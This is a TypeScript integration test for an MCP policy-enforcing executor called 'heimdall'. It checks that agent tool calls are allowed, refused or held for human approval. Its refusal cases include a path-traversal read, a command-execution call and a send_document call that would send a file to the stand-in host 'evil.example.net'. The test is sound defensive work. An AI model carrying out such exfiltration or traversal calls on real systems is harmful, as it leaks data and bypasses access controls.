/**
 * The supported integration, end to end over real stdio and real HTTP:
 *   MCP client (the "agent")  <--stdio-->  heimdall MCP server (trusted executor)  <--HTTP-->  Heimdall service
 * The agent side never has a path to the protected folder; every side-effect assertion reads the disk from the TEST process.
 */
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { serve } from "@hono/node-server";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { PolicyDocument } from "../src/shared/policy.js";
import { makeEnv, makeWorld, type Env, type World } from "./helpers.js";

const POLICY: PolicyDocument = {
  schema_version: 1,
  classifications: [{ resources: ["docs/**", "summaries/**"], level: "internal" }],
  rules: [
    { id: "no-cmd", effect: "deny", match: { operations: ["command_execution"] } },
    { id: "del-approval", effect: "require_approval", match: { tools: ["documents"], operations: ["delete"], resources: ["docs/**"] }, approval: { required_role: "admin", ttl_seconds: 900 } },
    { id: "read", effect: "allow", match: { tools: ["documents"], operations: ["read"], resources: ["docs/**"] } },
    { id: "write-summary", effect: "allow", match: { tools: ["documents"], operations: ["create"], resources: ["summaries/**"] } },
    { id: "send", effect: "allow", match: { tools: ["transfer"], operations: ["external_transfer"], destination_domains: ["partner.example.com"] } },
  ],
};

let env: Env;
let http: ReturnType<typeof serve>;
let baseUrl = "";
const buildDir = resolve(".tmp-mcp-build");
const tmp = mkdtempSync(join(tmpdir(), "heimdall-mcp-"));

beforeAll(async () => {
  env = await makeEnv();
  await new Promise<void>((r) => {
    http = serve({ fetch: env.app.fetch, port: 0, hostname: "127.0.0.1" }, (i) => {
      baseUrl = `http://127.0.0.1:${i.port}`;
      r();
    });
  });
  rmSync(buildDir, { recursive: true, force: true });
  execFileSync(process.execPath, ["node_modules/typescript/bin/tsc", "-p", "tsconfig.server.json", "--outDir", buildDir], { stdio: "pipe" });
}, 180_000);
afterAll(async () => {
  http?.close();
  await env.close();
  rmSync(buildDir, { recursive: true, force: true });
  rmSync(tmp, { recursive: true, force: true });
});

async function connect(w: World, extra: Record<string, string> = {}, url = baseUrl) {
  const root = join(tmp, `root-${Math.random().toString(36).slice(2)}`);
  mkdirSync(join(root, "docs"), { recursive: true });
  mkdirSync(join(root, "summaries"), { recursive: true });
  writeFileSync(join(root, "docs", "handbook.txt"), "HANDBOOK CONTENT");
  writeFileSync(join(root, "docs", "old-notes.txt"), "OLD NOTES");
  writeFileSync(join(root, "docs", "keep.txt"), "KEEP ME");
  const trap = join(tmp, `spawn-${Math.random().toString(36).slice(2)}.log`);
  const client = new Client({ name: "test-agent", version: "1.0.0" });
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [join(buildDir, "integrations", "mcp", "server.js")],
    env: {
      PATH: process.env.PATH ?? "", SystemRoot: process.env.SystemRoot ?? "", HEIMDALL_STATE_DIR: join(tmp, `state-${Math.random().toString(36).slice(2)}`), HEIMDALL_URL: url, HEIMDALL_KEY: w.apiKey, HEIMDALL_ROOT: root,
      NODE_OPTIONS: `--require "${resolve("tests/fixtures/spawn-trap.cjs").replace(/\\/g, "/")}"`, SPAWN_TRAP_FILE: trap, ...extra,
    },
    stderr: "pipe",
  });
  await client.connect(transport);
  const call = async (name: string, args: Record<string, unknown>) => {
    const r: any = await client.callTool({ name, arguments: args });
    return { text: (r.content?.[0]?.text ?? "") as string, isError: !!r.isError };
  };
  return { client, call, root, trap, close: () => client.close() };
}

describe("MCP integration (real stdio + real HTTP)", () => {
  it("exposes the tools, authorizes before executing, and every refusal leaves the disk untouched", async () => {
    const w = await makeWorld(env, { policy: POLICY });
    const a = await connect(w);
    try {
      const tools = (await a.client.listTools()).tools.map((t) => t.name).sort();
      expect(tools).toEqual(["delete_document", "read_document", "run_command", "send_document", "write_summary"]);

      const read = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(read.isError).toBe(false);
      expect(read.text).toContain("HANDBOOK CONTENT");
      const sum = await a.call("write_summary", { path: "summaries/s.txt", text: "my summary" });
      expect(sum.text).toContain("EXECUTED");
      expect(readFileSync(join(a.root, "summaries", "s.txt"), "utf8")).toBe("my summary");

      // refusals
      for (const [name, args] of [
        ["read_document", { path: "../outside.txt" }], ["read_document", { path: "reports/q3.txt" }], ["write_summary", { path: "docs/injected.txt", text: "x" }],
        ["send_document", { path: "docs/handbook.txt", destination: "https://evil.example.net/" }], ["send_document", { path: "docs/handbook.txt", destination: "https://partner.example.com/x" }],
      ] as const) {
        const r = await a.call(name, args as any);
        expect(r.isError, `${name} ${JSON.stringify(args)}`).toBe(true);
        expect(r.text).toMatch(/REFUSED|NOT EXECUTED/);
      }
      expect(existsSync(join(a.root, "docs", "injected.txt"))).toBe(false);

      // arbitrary command execution: refused, and no subprocess was ever started inside the executor process
      const cmd = await a.call("run_command", { command: "calc.exe" });
      expect(cmd.isError).toBe(true);
      expect(cmd.text).toContain("REFUSED (EXPLICIT_DENY)");
      expect(existsSync(a.trap)).toBe(false); // the trap file is only created if child_process was invoked
    } finally {
      await a.close();
    }
  }, 120_000);

  it("deletion waits for approval, then runs exactly once; replay, expiry, policy change and revocation all fail", async () => {
    const w = await makeWorld(env, { policy: POLICY });
    const a = await connect(w, { HEIMDALL_FAST_PATH: "0" }); // strict online mode: revocation applies on the very next call
    try {
      const file = join(a.root, "docs", "old-notes.txt");
      const first = await a.call("delete_document", { path: "docs/old-notes.txt" });
      expect(first.text).toContain("WAITING FOR HUMAN APPROVAL");
      expect(existsSync(file)).toBe(true);
      const requestId = /request_id="([^"]+)"/.exec(first.text)![1];

      const approvals = (await w.owner.api("GET", `/api/orgs/${w.orgId}/approvals?status=pending`)).body.items;
      expect(approvals).toHaveLength(1);
      expect(approvals[0]).toMatchObject({ operation: "delete", resource: "docs/old-notes.txt" });
      expect(existsSync(file)).toBe(true); // still there while waiting
      expect((await w.owner.api("POST", `/api/orgs/${w.orgId}/approvals/${approvals[0].id}/approve`, {})).status).toBe(200);

      const done = await a.call("delete_document", { path: "docs/old-notes.txt", request_id: requestId });
      expect(done.text).toContain("EXECUTED");
      expect(existsSync(file)).toBe(false);

      writeFileSync(file, "RECREATED");
      const replay = await a.call("delete_document", { path: "docs/old-notes.txt", request_id: requestId });
      expect(replay.isError).toBe(true);
      expect(replay.text).toMatch(/REFUSED/);
      expect(readFileSync(file, "utf8")).toBe("RECREATED");

      // a different file never inherits the approval
      const other = await a.call("delete_document", { path: "docs/keep.txt" });
      expect(other.text).toContain("WAITING");
      expect(readFileSync(join(a.root, "docs", "keep.txt"), "utf8")).toBe("KEEP ME");
      // expiry
      await env.db.query("UPDATE approvals SET status = 'approved', decided_at = now(), grant_expires_at = now() - interval '1 second' WHERE status = 'pending' AND org_id = $1", [w.orgId]);
      const expired = await a.call("delete_document", { path: "docs/keep.txt", request_id: /request_id="([^"]+)"/.exec(other.text)![1] });
      expect(expired.isError).toBe(true);
      expect(readFileSync(join(a.root, "docs", "keep.txt"), "utf8")).toBe("KEEP ME");

      // revocation: the credential stops working at once and the tool fails closed
      await w.owner.api("POST", `/api/orgs/${w.orgId}/credentials/${w.credentialId}/revoke`);
      const after = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(after.isError).toBe(true);
      expect(after.text).toContain("NOT EXECUTED (CREDENTIAL_REVOKED)");
      expect(after.text).not.toContain("HANDBOOK CONTENT");
    } finally {
      await a.close();
    }
  }, 120_000);

  it("a changed policy stops an authorized-but-unclaimed action, and the service being down fails closed", async () => {
    const w = await makeWorld(env, { policy: POLICY });
    const a = await connect(w, { HEIMDALL_FAST_PATH: "0" }); // strict online mode: every call asks the service
    try {
      expect((await a.call("read_document", { path: "docs/handbook.txt" })).text).toContain("EXECUTED");
      await w.owner.api("PUT", `/api/orgs/${w.orgId}/policies/${w.policyId}`, { document: { schema_version: 1, rules: [] } });
      const denied = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(denied.isError).toBe(true);
      expect(denied.text).toContain("REFUSED (NO_MATCHING_RULE)");
    } finally {
      await a.close();
    }
    const down = await connect(w, { HEIMDALL_URL: "http://127.0.0.1:9" }); // nothing listens there; fresh state dir => no policy cache
    try {
      const r = await down.call("read_document", { path: "docs/handbook.txt" });
      expect(r.isError).toBe(true);
      expect(r.text).toContain("NOT EXECUTED");
      expect(r.text).not.toContain("HANDBOOK CONTENT");
    } finally {
      await down.close();
    }
  }, 120_000);

  it("fast path (default): routine calls are decided in-process; policy changes and revocation apply within the check interval", async () => {
    const w = await makeWorld(env, { policy: POLICY });
    const a = await connect(w, { HEIMDALL_FAST_PATH_CHECK_MS: "200" });
    const settle = () => new Promise((r) => setTimeout(r, 1200));
    try {
      expect((await a.call("read_document", { path: "docs/handbook.txt" })).text).toContain("EXECUTED");
      // approvals still wait for a person
      expect((await a.call("delete_document", { path: "docs/old-notes.txt" })).text).toContain("WAITING FOR HUMAN APPROVAL");
      expect(existsSync(join(a.root, "docs", "old-notes.txt"))).toBe(true);

      await w.owner.api("PUT", `/api/orgs/${w.orgId}/policies/${w.policyId}`, { document: { schema_version: 1, rules: [] } });
      await settle();
      const denied = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(denied.isError).toBe(true);
      expect(denied.text).toContain("REFUSED (NO_MATCHING_RULE)");

      await w.owner.api("PUT", `/api/orgs/${w.orgId}/policies/${w.policyId}`, { document: POLICY });
      await settle();
      expect((await a.call("read_document", { path: "docs/handbook.txt" })).text).toContain("EXECUTED");

      await w.owner.api("POST", `/api/orgs/${w.orgId}/credentials/${w.credentialId}/revoke`);
      await settle();
      const after = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(after.isError).toBe(true);
      expect(after.text).toContain("NOT EXECUTED (CREDENTIAL_REVOKED)");
      expect(after.text).not.toContain("HANDBOOK CONTENT");
    } finally {
      await a.close();
    }
    // the decisions it made locally reached the service
    const src = await env.db.query<any>("SELECT source, count(*)::int AS n FROM action_requests WHERE org_id = $1 GROUP BY source ORDER BY source", [w.orgId]);
    expect(src.find((r) => r.source === "local_fast")?.n).toBeGreaterThanOrEqual(2);
  }, 120_000);

  it("service outage mid-session: the running executor falls back to its signed cache, refuses approvals, and degrades visibly", async () => {
    const w = await makeWorld(env, { policy: POLICY });
    let tmpHttp!: ReturnType<typeof serve>;
    let url = "";
    await new Promise<void>((r) => {
      tmpHttp = serve({ fetch: env.app.fetch, port: 0, hostname: "127.0.0.1" }, (i) => {
        url = `http://127.0.0.1:${i.port}`;
        r();
      });
    });
    const a = await connect(w, {}, url);
    try {
      expect((await a.call("read_document", { path: "docs/handbook.txt" })).text).toContain("EXECUTED");
      await new Promise<void>((r) => tmpHttp.close(() => r())); // the cloud disappears while the laptop keeps running
      const read = await a.call("read_document", { path: "docs/handbook.txt" });
      expect(read.isError).toBe(false);
      expect(read.text).toContain("HANDBOOK CONTENT"); // allowed by the cached signed policy
      const del = await a.call("delete_document", { path: "docs/old-notes.txt" });
      expect(del.isError).toBe(true);
      expect(del.text).toContain("APPROVAL_REQUIRED"); // cannot be approved offline: refused, never allowed
      expect(existsSync(join(a.root, "docs", "old-notes.txt"))).toBe(true);
      const cmd = await a.call("run_command", { command: "calc.exe" });
      expect(cmd.isError).toBe(true);
      expect(existsSync(a.trap)).toBe(false);
    } finally {
      await a.close();
    }
  }, 120_000);
});
